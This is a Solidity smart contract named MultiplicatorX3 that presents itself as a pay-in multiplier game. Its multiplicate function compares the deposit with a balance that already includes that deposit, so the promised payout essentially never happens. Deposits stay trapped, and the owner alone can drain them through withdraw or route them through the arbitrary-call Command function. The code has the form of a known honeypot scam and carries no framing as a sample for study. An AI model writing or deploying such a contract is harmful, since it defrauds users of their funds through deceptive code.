pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr != address(0)); // added check for valid address

        bool success;
        bytes memory returnData;
        assembly {
            success := call(gas, adr, msg.value, add(data, 0x20), mload(data), 0, 0)
            returnData := mload(0x40)
            let size := returndatasize
            returndatacopy(returnData, 0, size)
        }
        require(success); // added check for successful execution
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }
}